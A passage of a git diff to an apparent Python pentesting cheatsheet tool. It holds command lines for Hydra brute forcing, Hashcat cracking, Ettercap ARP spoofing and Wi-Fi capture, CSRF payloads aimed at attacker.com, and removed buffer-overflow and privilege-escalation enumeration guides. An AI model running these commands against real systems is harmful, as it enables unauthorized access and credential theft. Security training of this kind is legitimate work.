-            if 0 <= idx < len(cmd_names):
-                name = cmd_names[idx]
+        try:
+            user_input = self.get_user_input("Select command to delete: ")
+            if user_input is None:
+                return
+            choice = int(user_input) - 1
+            command_names = list(self.custom_commands.keys())
+            if 0 <= choice < len(command_names):
+                name = command_names[choice]
                 confirm = self.get_user_input(f"Delete '{name}'? (y/N): ")
-                if confirm.lower() == "y":
+                if confirm and confirm.lower() == "y":
                     del self.custom_commands[name]
-                    self.print_success("Custom command deleted")
+                    self.print_success(f"Deleted command: {name}")
+                else:
+                    self.print_info("Deletion cancelled")
+            else:
+                self.print_error("Invalid selection")
+        except ValueError:
+            self.print_error("Please enter a valid number")
 
-    # Additional method stubs for other cheatsheets and references
     def _wireshark_cheatsheet(self):
-        """Wireshark cheatsheet"""
+        """Wireshark command cheatsheet"""
         commands = {
             "Display Filters": [
-                ("ip.addr == 192.168.1.1", "Filter by IP address"),
-                ("tcp.port == 80", "Filter by TCP port"),
-                ("http", "Show only HTTP traffic"),
-                ("dns", "Show only DNS traffic"),
-                ("tcp.flags.syn == 1", "Show SYN packets"),
-                ("http.request.method == GET", "Show HTTP GET requests"),
+                ("http", "Show HTTP traffic"),
+                ("tcp.port == 80", "Show traffic on port 80"),
+                ("ip.addr == 192.168.1.1", "Show traffic to/from IP"),
+                ("http.request.method == POST", "Show HTTP POST requests"),
+                ("ssl", "Show SSL/TLS traffic"),
+                ("dns", "Show DNS traffic"),
             ],
             "Capture Filters": [
-                ("host 192.168.1.1", "Capture from specific host"),
-                ("port 80", "Capture on specific port"),
-                ("tcp port 80", "Capture TCP traffic on port 80"),
-                ("not broadcast and not multicast", "Exclude broadcast/multicast"),
-                ("src host 192.168.1.1", "Capture from source host"),
+                ("host 192.168.1.1", "Capture traffic to/from host"),
+                ("port 80", "Capture traffic on port 80"),
+                ("tcp", "Capture TCP traffic only"),
+                ("udp", "Capture UDP traffic only"),
+                ("not port 22", "Capture all traffic except SSH"),
+            ],
+            "Analysis": [
+                ("Follow TCP Stream", "Follow conversation between hosts"),
+                ("Follow HTTP Stream", "Follow HTTP conversation"),
+                ("Export Objects", "Extract files from traffic"),
+                ("Statistics > Protocol Hierarchy", "See traffic breakdown"),
+                ("Statistics > Conversations", "See host conversations"),
             ],
         }
+
         self._display_cheatsheet("Wireshark", commands)
 
     def _nikto_cheatsheet(self):
-        """Nikto cheatsheet"""
+        """Nikto command cheatsheet"""
         commands = {
-            "Basic Scans": [
-                ("nikto -h <target>", "Basic scan"),
-                ("nikto -h <target> -p 80,443", "Scan specific ports"),
-                ("nikto -h <target> -ssl", "Force SSL"),
-                ("nikto -h <target> -nossl", "Disable SSL"),
-                ("nikto -h <target> -Format htm", "HTML output"),
-            ]
+            "Basic Usage": [
+                ("nikto -h example.com", "Basic web server scan"),
+                ("nikto -h example.com -p 443", "Scan HTTPS on port 443"),
+                ("nikto -h example.com -ssl", "Force SSL/HTTPS scan"),
+                ("nikto -h example.com -port 8080", "Scan on custom port"),
+            ],
+            "Output Options": [
+                ("nikto -h example.com -o results.txt", "Save to text file"),
+                ("nikto -h example.com -F txt", "Force text output format"),
+                ("nikto -h example.com -Format txt", "Alternative format option"),
+                ("nikto -h example.com -v", "Verbose output"),
+            ],
         }
+
         self._display_cheatsheet("Nikto", commands)
 
     def _dirb_gobuster_cheatsheet(self):
-        """Dirb/Gobuster cheatsheet"""
+        """Dirb/Gobuster command cheatsheet"""
         commands = {
             "Dirb": [
-                ("dirb <url>", "Basic directory scan"),
-                ("dirb <url> <wordlist>", "Custom wordlist"),
-                ("dirb <url> -X .php,.html", "Specific extensions"),
-                ("dirb <url> -o output.txt", "Save output to file"),
+                ("dirb http://example.com", "Basic directory bruteforce"),
+                ("dirb http://example.com /usr/share/dirb/wordlists/common.txt",
+                 "Use specific wordlist"),
+                ("dirb http://example.com -X .php", "Search for PHP files"),
+                ("dirb http://example.com -r", "Recursive scan"),
             ],
             "Gobuster": [
-                ("gobuster dir -u <url> -w <wordlist>", "Directory bruteforce"),
-                ("gobuster dns -d <domain> -w <wordlist>", "DNS subdomain bruteforce"),
-                ("gobuster vhost -u <url> -w <wordlist>", "Virtual host bruteforce"),
+                ("gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt",
+                 "Basic directory bruteforce"),
+                ("gobuster dir -u http://example.com -w wordlist.txt -x php,html",
+                 "Search with extensions"),
+                ("gobuster dir -u http://example.com -w wordlist.txt -t 50",
+                 "Use 50 threads"),
+                ("gobuster vhost -u http://example.com -w subdomains.txt",
+                 "Virtual host bruteforce"),
             ],
         }
+
         self._display_cheatsheet("Dirb/Gobuster", commands)
 
     def _hydra_cheatsheet(self):
-        """Hydra cheatsheet"""
+        """Hydra command cheatsheet"""
         commands = {
-            "Basic Attacks": [
-                ("hydra -l admin -p password <target> ssh", "SSH brute force"),
-                ("hydra -L users.txt -P passwords.txt <target> ftp", "FTP brute force"),
-                (
-                    "hydra -l admin -P passwords.txt <target> http-post-form",
-                    "HTTP form brute force",
-                ),
-            ]
+            "SSH Bruteforce": [
+                ("hydra -l username -P wordlist.txt ssh://192.168.1.1",
+                 "SSH password bruteforce"),
+                ("hydra -L users.txt -p password ssh://192.168.1.1",
+                 "SSH username bruteforce"),
+                ("hydra -l admin -P rockyou.txt ssh://192.168.1.1 -t 4",
+                 "SSH with 4 threads"),
+            ],
+            "HTTP Forms": [
+                ("hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form '/login.php:user=^USER^&pass=^PASS^:Invalid'",
+                 "HTTP POST form bruteforce"),
+                ("hydra -l admin -P wordlist.txt 192.168.1.1 http-get-form '/login.php:user=^USER^&pass=^PASS^:Invalid'",
+                 "HTTP GET form bruteforce"),
+            ],
         }
+
         self._display_cheatsheet("Hydra", commands)
 
     def _john_cheatsheet(self):
-        """John the Ripper cheatsheet"""
+        """John the Ripper command cheatsheet"""
         commands = {
             "Basic Usage": [
-                ("john hashes.txt", "Crack password hashes"),
-                ("john --wordlist=rockyou.txt hashes.txt", "Wordlist attack"),
-                ("john --show hashes.txt", "Show cracked passwords"),
-                ("john --format=md5 hashes.txt", "Specify hash format"),
-            ]
+                ("john hash.txt", "Crack password hashes"),
+                ("john --wordlist=wordlist.txt hash.txt", "Use specific wordlist"),
+                ("john --show hash.txt", "Show cracked passwords"),
+                ("john --format=raw-md5 hash.txt", "Specify hash format"),
+            ],
         }
+
         self._display_cheatsheet("John the Ripper", commands)
 
     def _hashcat_cheatsheet(self):
-        """Hashcat cheatsheet"""
+        """Hashcat command cheatsheet"""
         commands = {
+            "Basic Usage": [
+                ("hashcat -m 0 hash.txt wordlist.txt", "MD5 cracking"),
+                ("hashcat -m 1000 hash.txt wordlist.txt", "NTLM cracking"),
+                ("hashcat -m 1800 hash.txt wordlist.txt", "SHA512 cracking"),
+                ("hashcat -m 0 hash.txt wordlist.txt -r rules.txt",
+                 "Use rule file"),
+            ],
             "Attack Modes": [
-                (
-                    "hashcat -m 0 -a 0 hashes.txt wordlist.txt",
-                    "Dictionary attack (MD5)",
-                ),
-                (
-                    "hashcat -m 1000 -a 0 hashes.txt wordlist.txt",
-                    "Dictionary attack (NTLM)",
-                ),
-                ("hashcat -m 0 -a 3 hashes.txt ?d?d?d?d", "Brute force attack"),
-                ("hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d", "Hybrid attack"),
-            ]
+                ("hashcat -a 0 -m 0 hash.txt wordlist.txt", "Dictionary attack"),
+                ("hashcat -a 1 -m 0 hash.txt wordlist1.txt wordlist2.txt",
+                 "Combinator attack"),
+                ("hashcat -a 3 -m 0 hash.txt ?a?a?a?a", "Mask attack (4 chars)"),
+            ],
         }
+
         self._display_cheatsheet("Hashcat", commands)
 
     def _aircrack_cheatsheet(self):
-        """Aircrack-ng cheatsheet"""
+        """Aircrack-ng command cheatsheet"""
         commands = {
-            "Wireless Commands": [
-                ("airmon-ng start wlan0", "Enable monitor mode"),
+            "Interface": [
+                ("airmon-ng start wlan0", "Start monitor mode"),
+                ("airmon-ng stop wlan0mon", "Stop monitor mode"),
+                ("iwconfig", "List wireless interfaces"),
+            ],
+            "Reconnaissance": [
                 ("airodump-ng wlan0mon", "Scan for networks"),
-                ("aireplay-ng -0 10 -a <BSSID> wlan0mon", "Deauth attack"),
-                ("aircrack-ng -w wordlist.txt capture.cap", "Crack WPA/WPA2"),
-            ]
+                ("airodump-ng -c 6 -w capture wlan0mon", "Capture on channel 6"),
+                ("airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon",
+                 "Capture specific network"),
+            ],
         }
+
         self._display_cheatsheet("Aircrack-ng", commands)
 
     def _ettercap_cheatsheet(self):
-        """Ettercap cheatsheet"""
+        """Ettercap command cheatsheet"""
         commands = {
             "Basic Usage": [
-                (
-                    "ettercap -T -M arp:remote /<target1>// /<target2>//",
-                    "ARP poisoning",
-                ),
-                ("ettercap -T -M arp:remote /<gateway>// /<target>//", "MITM attack"),
-                ("ettercap -T -q -i eth0", "Passive sniffing"),
-            ]
+                ("ettercap -G", "Start graphical interface"),
+                ("ettercap -T -q -i eth0", "Text interface, quiet mode"),
+                ("ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.2/",
+                 "ARP spoofing between hosts"),
+            ],
         }
+
         self._display_cheatsheet("Ettercap", commands)
 
     def _tcpdump_cheatsheet(self):
-        """tcpdump cheatsheet"""
+        """tcpdump command cheatsheet"""
         commands = {
-            "Basic Capture": [
+            "Basic Usage": [
                 ("tcpdump -i eth0", "Capture on interface"),
-                ("tcpdump host 192.168.1.1", "Capture from specific host"),
-                ("tcpdump port 80", "Capture on specific port"),
-                ("tcpdump -w capture.pcap", "Write to file"),
+                ("tcpdump -i eth0 -w capture.pcap", "Save to file"),
                 ("tcpdump -r capture.pcap", "Read from file"),
-            ]
+                ("tcpdump -i eth0 port 80", "Capture HTTP traffic"),
+            ],
+            "Filters": [
+                ("tcpdump host 192.168.1.1", "Filter by host"),
+                ("tcpdump src host 192.168.1.1", "Filter by source"),
+                ("tcpdump dst host 192.168.1.1", "Filter by destination"),
+                ("tcpdump tcp port 80", "Filter TCP port 80"),
+            ],
         }
+
         self._display_cheatsheet("tcpdump", commands)
 
     def _openssl_cheatsheet(self):
-        """OpenSSL cheatsheet"""
+        """OpenSSL command cheatsheet"""
         commands = {
-            "Certificate Operations": [
-                ("openssl x509 -in cert.pem -text -noout", "View certificate"),
-                ("openssl s_client -connect host:443", "Test SSL connection"),
-                (
-                    "openssl req -new -keyout key.pem -out req.pem",
-                    "Generate certificate request",
-                ),
-                ("openssl genrsa -out key.pem 2048", "Generate RSA private key"),
-            ]
+            "Certificate Analysis": [
+                ("openssl s_client -connect example.com:443", "Connect to SSL service"),
+                ("openssl x509 -in cert.pem -text -noout", "View certificate details"),
+                ("openssl s_client -connect example.com:443 -servername example.com",
+                 "SNI connection"),
+            ],
+            "Key Generation": [
+                ("openssl genrsa -out private.key 2048", "Generate RSA private key"),
+                ("openssl req -new -key private.key -out request.csr",
+                 "Generate CSR"),
+                ("openssl x509 -req -in request.csr -signkey private.key -out cert.pem",
+                 "Self-sign certificate"),
+            ],
         }
+
         self._display_cheatsheet("OpenSSL", commands)
 
     def _curl_wget_cheatsheet(self):
-        """curl/wget cheatsheet"""
+        """curl/wget command cheatsheet"""
         commands = {
             "curl": [
-                ("curl -X GET <url>", "GET request"),
-                ("curl -X POST -d 'data' <url>", "POST request"),
-                ("curl -H 'Header: value' <url>", "Custom header"),
-                ("curl -b 'cookie=value' <url>", "Send cookie"),
-                ("curl -k <url>", "Ignore SSL errors"),
+                ("curl http://example.com", "Basic GET request"),
+                ("curl -X POST -d 'data' http://example.com", "POST request"),
+                ("curl -H 'User-Agent: Custom' http://example.com", "Custom headers"),
+                ("curl -k https://example.com", "Ignore SSL errors"),
+                ("curl -c cookies.txt http://example.com", "Save cookies"),
+                ("curl -b cookies.txt http://example.com", "Use cookies"),
             ],
             "wget": [
-                ("wget <url>", "Download file"),
-                ("wget -r <url>", "Recursive download"),
-                ("wget --user-agent='agent' <url>", "Custom user agent"),
-                ("wget --no-check-certificate <url>", "Ignore SSL errors"),
+                ("wget http://example.com", "Download file"),
+                ("wget -r http://example.com", "Recursive download"),
+                ("wget --user-agent='Custom' http://example.com", "Custom user agent"),
+                ("wget --no-check-certificate https://example.com",
+                 "Ignore SSL errors"),
             ],
         }
+
         self._display_cheatsheet("curl/wget", commands)
 
     def _owasp_top10_reference(self):
-        """OWASP Top 10 reference"""
-        top10 = [
-            "1. Injection",
-            "2. Broken Authentication",
-            "3. Sensitive Data Exposure",
-            "4. XML External Entities (XXE)",
-            "5. Broken Access Control",
-            "6. Security Misconfiguration",
-            "7. Cross-Site Scripting (XSS)",
-            "8. Insecure Deserialization",
-            "9. Using Components with Known Vulnerabilities",
-            "10. Insufficient Logging & Monitoring",
+        """Display OWASP Top 10 vulnerabilities"""
+        print("\n\033[93mOWASP TOP 10 VULNERABILITIES\033[0m")
+        print("\033[93m" + "="*40 + "\033[0m")
+
+        vulnerabilities = [
+            ("A01:2021 - Broken Access Control", "Insufficient access controls"),
+            ("A02:2021 - Cryptographic Failures", "Weak encryption implementation"),
+            ("A03:2021 - Injection", "SQL, NoSQL, LDAP, OS injection"),
+            ("A04:2021 - Insecure Design", "Flaws in architecture/design"),
+            ("A05:2021 - Security Misconfiguration", "Poor security settings"),
+            ("A06:2021 - Vulnerable Components", "Outdated/unsafe dependencies"),
+            ("A07:2021 - Authentication Failures", "Weak authentication mechanisms"),
+            ("A08:2021 - Software & Data Integrity", "Untrusted data/updates"),
+            ("A09:2021 - Security Logging Failures", "Insufficient logging/monitoring"),
+            ("A10:2021 - SSRF", "Server-Side Request Forgery"),
         ]
 
-        print(f"\n\033[93m{'OWASP TOP 10 - 2017'.center(50)}\033[0m")
-        print(f"\033[93m{'-'*50}\033[0m")
-        for item in top10:
-            print(f"\033[96m{item}\033[0m")
+        for i, (vuln, desc) in enumerate(vulnerabilities, 1):
+            print(f"\n\033[96m{i:2d}.\033[0m {vuln}")
+            print(f"    {desc}")
 
     def _sql_injection_reference(self):
-        """SQL injection reference"""
-        self.print_info(
-            "SQL Injection techniques and payloads displayed above in payload generators"
-        )
+        """Display SQL injection reference"""
+        print("\n\033[93mSQL INJECTION REFERENCE\033[0m")
+        print("\033[93m" + "="*30 + "\033[0m")
+        print("Use the SQL Injection Payload Generator for detailed payloads")
 
     def _xss_reference(self):
-        """XSS reference"""
-        self.print_info(
-            "XSS techniques and payloads displayed above in payload generators"
-        )
+        """Display XSS reference"""
+        print("\n\033[93mCROSS-SITE SCRIPTING (XSS) REFERENCE\033[0m")
+        print("\033[93m" + "="*45 + "\033[0m")
+        print("Use the XSS Payload Generator for detailed payloads")
 
     def _csrf_reference(self):
-        """CSRF (Cross-Site Request Forgery) reference"""
-        csrf_info = {
-            "Prevention": [
-                ("Use CSRF tokens in forms", "Add unique tokens to each form"),
-                ("Verify HTTP Referer header", "Check request origin"),
-                ("Use SameSite cookie attribute", "Prevent cross-site cookie usage"),
-                ("Implement double-submit cookies", "Additional CSRF protection"),
-            ],
-            "Testing": [
-                ("Remove CSRF token from request", "Test if protection exists"),
-                ("Change request method", "POST to GET conversion"),
-                ("Use different Content-Type", "application/json to text/plain"),
-                ("Cross-origin requests", "Test from different domain"),
-            ],
-        }
-        self._display_cheatsheet("CSRF Protection & Testing", csrf_info)
+        """Display CSRF reference"""
+        print("\n\033[93mCROSS-SITE REQUEST FORGERY (CSRF) REFERENCE\033[0m")
+        print("\033[93m" + "="*50 + "\033[0m")
+
+        print("\n\033[96mWhat is CSRF?\033[0m")
+        print(
+            "CSRF forces authenticated users to perform unwanted actions "
+            "on websites they're logged into."
+        )
+
+        print("\n\033[96mCommon CSRF Payloads:\033[0m")
+        payloads = [
+            ("<img src='http://attacker.com/csrf'>", "Image-based CSRF"),
+            ("<iframe src='http://attacker.com/csrf'></iframe>", "Iframe-based CSRF"),
+            ("<script>document.location='http://attacker.com/csrf'</script>",
+             "JavaScript-based CSRF"),
+        ]
+
+        for i, (payload, desc) in enumerate(payloads, 1):
+            print(f"\n\033[94m{i}. Payload:\033[0m \033[92m{payload}\033[0m")
+            print(f"\033[93m   Description:\033[0m {desc}")
+
+        print("\n\033[96mPrevention:\033[0m")
+        print("• Use CSRF tokens in forms")
+        print("• Implement SameSite cookie attribute")
+        print("• Validate Referer headers")
+        print("• Use double-submit cookie pattern")
 
     def _buffer_overflow_reference(self):
-        """Buffer overflow reference with comprehensive use cases"""
-        print(f"\n\033[96m📚 WHAT IS BUFFER OVERFLOW?\033[0m")
+        """Display buffer overflow reference"""
+        print("\n\033[93mBUFFER OVERFLOW REFERENCE\033[0m")
+        print("\033[93m" + "="*35 + "\033[0m")
+
+        print("\n\033[96mWhat is Buffer Overflow?\033[0m")
         print(
-            "Buffer overflow occurs when a program writes more data to a memory buffer"
-        )
-        print("than it can hold, potentially overwriting adjacent memory and hijacking")
-        print("program execution flow to run malicious code.")
-        print(f"\n\033[93m💡 REAL-WORLD SCENARIOS WHERE YOU'D USE THESE:\033[0m")
-        print("• CTF competitions: Binary exploitation challenges")
-        print("• Penetration testing: Exploiting custom software vulnerabilities")
-        print("• Bug bounty hunting: Finding memory corruption in applications")
-        print("• Red team exercises: Post-exploitation and privilege escalation")
-        print(
-            f"\n\033[91m⚠️  LEGAL WARNING:\033[0m Only use on systems you own or have explicit permission to test!"
+            "Buffer overflow occurs when a program writes data beyond the "
+            "allocated memory buffer, potentially overwriting adjacent memory."
         )
 
-        buffer_info = {
-            "Stack-based Buffer Overflow": [
-                (
-                    "python -c \"print 'A'*100\"",
-                    "Generate pattern to crash program\n"
-                    + "   WHY: First step - see if program crashes with input\n"
-                    + "   WHEN: Testing if buffer overflow exists\n"
-                    + "   EXAMPLE: ./vulnerable_program $(python -c \"print 'A'*100\")\n"
-                    + "   USE CASE: CTF binary challenges, testing custom software",
-                ),
-                (
-                    "msf-pattern_create -l 200",
-                    "Create unique pattern to find exact crash point\n"
-                    + "   WHY: Each position has unique 4-byte sequence\n"
-                    + "   WHEN: After confirming crash, need to find exact overflow point\n"
-                    + "   EXAMPLE: Creates 'Aa0Aa1Aa2Aa3...' pattern\n"
-                    + "   USE CASE: Determining exactly where return address is overwritten",
-                ),
-                (
-                    "msf-pattern_offset -q 0x41414141",
-                    "Find offset where return address gets overwritten\n"
-                    + "   WHY: Tells you exactly how many bytes before return address\n"
-                    + "   WHEN: After crash with unique pattern, use crashed EIP value\n"
-                    + "   EXAMPLE: Returns 'offset: 112' meaning 112 bytes + return address\n"
-                    + "   USE CASE: Building exploit payload with correct padding",
-                ),
-                (
-                    "objdump -d binary | grep jmp",
-                    "Find JMP instructions for exploit development\n"
-                    + "   WHY: Need to redirect execution to your shellcode\n"
-                    + "   WHEN: Building exploit, need JMP ESP or similar instruction\n"
-                    + "   EXAMPLE: 0x08048abc <+123>: jmp *%esp\n"
-                    + "   USE CASE: Stack-based exploits where you control ESP register",
-                ),
-            ],
-            "Heap-based Buffer Overflow": [
-                (
-                    "ltrace ./program",
-                    "Trace library calls to understand heap usage\n"
-                    + "   WHY: Shows malloc(), free(), strcpy() calls that affect heap\n"
-                    + "   WHEN: Analyzing how program manages dynamic memory\n"
-                    + "   EXAMPLE: malloc(256) = 0x602010, strcpy(0x602010, user_input)\n"
-                    + "   USE CASE: Finding heap corruption vulnerabilities in malloc/free",
-                ),
-                (
-                    "valgrind ./program",
-                    "Memory debugging to find heap corruption\n"
-                    + "   WHY: Detects heap buffer overflows and use-after-free bugs\n"
-                    + "   WHEN: Testing for memory corruption that crashes don't show\n"
-                    + "   EXAMPLE: 'Invalid write of size 4 at 0x602014'\n"
-                    + "   USE CASE: Finding subtle heap vulnerabilities in complex programs",
-                ),
-                (
-                    "gdb -batch -ex run -ex bt --args ./program",
-                    "Quick crash analysis with backtrace\n"
-                    + "   WHY: Shows call stack when program crashes\n"
-                    + "   WHEN: Understanding where heap corruption causes crash\n"
-                    + "   EXAMPLE: Shows functions called before crash\n"
-                    + "   USE CASE: Debugging heap exploitation attempts",
-                ),
-            ],
-            "Protection Bypass Techniques": [
-                (
-                    "checksec --file=binary",
-                    "Check binary security protections\n"
-                    + "   WHY: Shows ASLR, NX, Stack Canaries, PIE status\n"
-                    + "   WHEN: Planning exploit strategy based on enabled protections\n"
-                    + "   EXAMPLE: 'NX enabled, Stack Canaries found, ASLR disabled'\n"
-                    + "   USE CASE: Determining if you need ROP, ret2libc, or direct shellcode",
-                ),
-                (
-                    "ROPgadget --binary binary",
-                    "Find ROP gadgets for bypassing NX protection\n"
-                    + "   WHY: NX prevents shellcode execution, need existing instructions\n"
-                    + "   WHEN: Binary has NX enabled, need Return-Oriented Programming\n"
-                    + "   EXAMPLE: 0x08048123: pop ebx; ret\n"
-                    + "   USE CASE: Modern exploit development when direct shellcode blocked",
-                ),
-                (
-                    "rabin2 -I binary",
-                    "Binary information including security features\n"
-                    + "   WHY: Shows architecture, endianness, security mitigations\n"
-                    + "   WHEN: Initial reconnaissance before exploit development\n"
-                    + "   EXAMPLE: arch x86, bits 32, canary false, nx true\n"
-                    + "   USE CASE: Understanding target binary before writing exploit",
-                ),
-            ],
-        }
+        print("\n\033[96mTypes of Buffer Overflow:\033[0m")
+        types = [
+            ("Stack-based Buffer Overflow", "Overwrites stack memory"),
+            ("Heap-based Buffer Overflow", "Overwrites heap memory"),
+            ("Integer Overflow", "Arithmetic operation exceeds data type limits"),
+            ("Format String Vulnerability", "Exploits printf-style functions"),
+        ]
 
-        print(f"\n\033[96m🎯 TYPICAL WORKFLOW:\033[0m")
-        print("1. Test with 'A' pattern → See if program crashes")
-        print("2. Use unique pattern → Find exact crash point")
-        print("3. Calculate offset → Know how many bytes needed")
-        print("4. Check protections → Plan bypass strategy")
-        print("5. Find gadgets/jumps → Build working exploit")
+        for i, (type_name, desc) in enumerate(types, 1):
+            print(f"\n\033[94m{i}. {type_name}\033[0m")
+            print(f"   {desc}")
 
-        self._display_cheatsheet("Buffer Overflow Exploitation", buffer_info)
+        print("\n\033[96mCommon Vulnerable Functions:\033[0m")
+        functions = [
+            ("strcpy()", "No bounds checking"),
+            ("strcat()", "No bounds checking"),
+            ("gets()", "No bounds checking"),
+            ("sprintf()", "No bounds checking"),
+            ("scanf()", "No bounds checking"),
+        ]
+
+        for func, desc in functions:
+            print(f"• {func} - {desc}")
+
+        print("\n\033[96mExploitation Techniques:\033[0m")
+        techniques = [
+            ("NOP Sled", "Slide to shellcode"),
+            ("Return Address Overwrite", "Control execution flow"),
+            ("SEH Overwrite", "Structured Exception Handler"),
+            ("ROP Chains", "Return-Oriented Programming"),
+        ]
+
+        for i, (tech, desc) in enumerate(techniques, 1):
+            print(f"\n\033[94m{i}. {tech}\033[0m")
+            print(f"   {desc}")
+
+        print("\n\033[96mPrevention:\033[0m")
+        print("• Use bounds-checking functions (strncpy, strncat)")
+        print("• Enable stack canaries")
+        print("• Use Address Space Layout Randomization (ASLR)")
+        print("• Enable Data Execution Prevention (DEP)")
+        print("• Use safe programming languages (Java, Python, C#)")
+
+        print("\n\033[96mTools for Buffer Overflow:\033[0m")
+        tools = [
+            ("GDB", "GNU Debugger for analysis"),
+            ("Immunity Debugger", "Windows debugging"),
+            ("OllyDbg", "Windows assembly debugger"),
+            ("Metasploit", "Exploit framework"),
+            ("pattern_create.rb", "Create unique patterns"),
+            ("pattern_offset.rb", "Find offset in pattern"),
+        ]
+
+        for tool, desc in tools:
+            print(f"• {tool} - {desc}")
+
+        print("\n\033[96mBasic Exploitation Steps:\033[0m")
+        steps = [
+            ("1. Fuzzing", "Find vulnerable input parameter"),
+            ("2. Pattern Creation", "Create unique pattern to find offset"),
+            ("3. Offset Calculation", "Determine exact buffer size"),
+            ("4. Bad Character Analysis", "Identify unusable characters"),
+            ("5. Shellcode Generation", "Create payload"),
+            ("6. Exploit Development", "Combine all components"),
+        ]
+
+        for step, desc in steps:
+            print(f"• {step} - {desc}")
 
     def _privilege_escalation_reference(self):
-        """Privilege escalation reference with detailed use cases"""
-        print(f"\n\033[96m📚 WHAT IS PRIVILEGE ESCALATION?\033[0m")
-        print("Privilege escalation is the process of gaining higher access privileges")
+        """Display privilege escalation reference"""
+        print("\n\033[93mPRIVILEGE ESCALATION REFERENCE\033[0m")
+        print("\033[93m" + "="*40 + "\033[0m")
+
+        print("\n\033[96mWhat is Privilege Escalation?\033[0m")
         print(
-            "than initially obtained, often moving from regular user to administrator/root."
-        )
-        print(f"\n\033[93m💡 REAL-WORLD SCENARIOS WHERE YOU'D USE THESE:\033[0m")
-        print("• CTF competitions: Escalating from www-data to root")
-        print("• Red team exercises: Moving from initial access to domain admin")
-        print("• Penetration testing: Demonstrating full system compromise")
-        print("• Bug bounty hunting: Showing maximum impact of vulnerabilities")
-        print(
-            f"\n\033[91m⚠️  LEGAL WARNING:\033[0m Only use on systems you own or have explicit permission to test!"
+            "Privilege escalation is the act of exploiting a bug, design flaw, "
+            "or configuration oversight to gain elevated access to resources."
         )
 
-        privesc_info = {
-            "Linux Privilege Escalation": [
-                (
-                    "sudo -l",
-                    "Check what commands you can run with sudo\n"
-                    + "   WHY: Many privilege escalation paths through sudo misconfigurations\n"
-                    + "   WHEN: After gaining initial access (SSH, web shell, etc.)\n"
-                    + "   EXAMPLE: Shows '(root) NOPASSWD: /bin/vi' = can edit files as root\n"
-                    + "   USE CASE: CTF challenges, pentesting when user has sudo access",
-                ),
-                (
-                    "find / -perm -4000 2>/dev/null",
-                    "Find SUID binaries that run with owner's privileges\n"
-                    + "   WHY: SUID programs run as root even when called by regular users\n"
-                    + "   WHEN: Looking for vulnerable programs that can be exploited\n"
-                    + "   EXAMPLE: '/usr/bin/passwd' normally, but custom SUID binaries are dangerous\n"
-                    + "   USE CASE: Finding vulnerable custom binaries, GTFObins exploitation",
-                ),
-                (
-                    "ps aux | grep root",
-                    "Check processes running as root\n"
-                    + "   WHY: Root processes might have exploitable vulnerabilities\n"
-                    + "   WHEN: Looking for running services to target\n"
-                    + "   EXAMPLE: See MySQL running as root = potential privilege escalation vector\n"
-                    + "   USE CASE: Identifying service exploitation opportunities",
-                ),
-                (
-                    "crontab -l",
-                    "Check scheduled tasks for current user\n"
-                    + "   WHY: Cron jobs might run scripts you can modify\n"
-                    + "   WHEN: Looking for writable scripts executed by higher privileges\n"
-                    + "   EXAMPLE: Script runs every minute as root, but you can edit it\n"
-                    + "   USE CASE: Modifying cron scripts to execute reverse shells",
-                ),
-                (
-                    "cat /etc/passwd",
-                    "List system users and their home directories\n"
-                    + "   WHY: Shows user accounts and shell access\n"
-                    + "   WHEN: Understanding user structure for lateral movement\n"
-                    + "   EXAMPLE: 'admin:x:1000:1000:Admin User:/home/admin:/bin/bash'\n"
-                    + "   USE CASE: Finding other user accounts to target",
-                ),
-                (
-                    "uname -a",
-                    "System information including kernel version\n"
-                    + "   WHY: Kernel version reveals potential local exploits\n"
-                    + "   WHEN: First step in privilege escalation enumeration\n"
-                    + "   EXAMPLE: 'Linux 3.2.0-23-generic' = searchable for kernel exploits\n"
-                    + "   USE CASE: Finding kernel exploits (DirtyCow, etc.)",
-                ),
-                (
-                    "cat /proc/version",
-                    "Detailed kernel and compiler information\n"
-                    + "   WHY: More detailed than uname, shows compilation details\n"
-                    + "   WHEN: Researching specific kernel exploit compatibility\n"
-                    + "   EXAMPLE: Shows GCC version used to compile kernel\n"
-                    + "   USE CASE: Matching kernel exploits to exact system configuration",
-                ),
-                (
-                    "ls -la /home",
-                    "Check home directories for accessible files\n"
-                    + "   WHY: Users often store sensitive files in home directories\n"
-                    + "   WHEN: Looking for SSH keys, passwords, or readable files\n"
-                    + "   EXAMPLE: /home/user/.ssh/id_rsa or /home/user/.bash_history\n"
-                    + "   USE CASE: Finding SSH keys for lateral movement",
-                ),
-            ],
-            "Windows Privilege Escalation": [
-                (
-                    "whoami /priv",
-                    "Check current user's privileges and tokens\n"
-                    + "   WHY: Shows what privileges are enabled/disabled\n"
-                    + "   WHEN: Understanding what you can do with current access\n"
-                    + "   EXAMPLE: 'SeDebugPrivilege' = can debug other processes\n"
-                    + "   USE CASE: Token impersonation, process injection attacks",
-                ),
-                (
-                    "net user",
-                    "List all users on the system\n"
-                    + "   WHY: Shows user accounts for lateral movement targets\n"
-                    + "   WHEN: Identifying high-value accounts (admin, service accounts)\n"
-                    + "   EXAMPLE: Shows 'Administrator', 'Guest', and custom users\n"
-                    + "   USE CASE: Password spraying, targeting specific accounts",
-                ),
-                (
-                    "systeminfo",
-                    "Detailed system information including patches\n"
-                    + "   WHY: Shows Windows version and installed patches\n"
-                    + "   WHEN: Looking for missing patches = potential exploits\n"
-                    + "   EXAMPLE: 'Windows 10 Build 14393' with list of installed updates\n"
-                    + "   USE CASE: Finding unpatched vulnerabilities (MS17-010, etc.)",
-                ),
-                (
-                    "tasklist /svc",
-                    "Show running services and their processes\n"
-                    + "   WHY: Services often run with higher privileges\n"
-                    + "   WHEN: Looking for vulnerable services to exploit\n"
-                    + "   EXAMPLE: Custom service running as SYSTEM\n"
-                    + "   USE CASE: Service exploitation, DLL hijacking",
-                ),
-                (
-                    "wmic service list brief",
-                    "Detailed service information including paths\n"
-                    + "   WHY: Shows service executable paths and startup types\n"
-                    + "   WHEN: Looking for unquoted service paths or writable directories\n"
-                    + "   EXAMPLE: 'C:\\Program Files\\My Service\\service.exe' (unquoted)\n"
-                    + "   USE CASE: Unquoted service path exploitation",
-                ),
-                (
-                    "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
-                    "Check AlwaysInstallElevated policy\n"
-                    + "   WHY: If enabled, MSI packages install with SYSTEM privileges\n"
-                    + "   WHEN: Looking for privilege escalation through MSI installation\n"
